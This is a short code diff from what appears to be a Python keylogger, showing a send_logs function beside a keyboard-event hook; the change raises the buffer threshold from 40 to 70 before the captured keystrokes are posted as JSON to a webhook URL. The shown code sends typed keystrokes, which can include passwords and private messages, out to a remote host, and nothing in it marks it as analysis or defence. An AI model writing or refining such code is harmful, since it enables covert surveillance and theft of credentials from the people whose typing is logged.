@@ -89,7 +89,7 @@ def OnKeyboardEvent(event):
 
 def send_logs():
     global log
-    if len(log) > 40:
+    if len(log) > 70:
         log_content = "".join(log)
         requests.post(webhook_url, json={"content": log_content})
         log = []
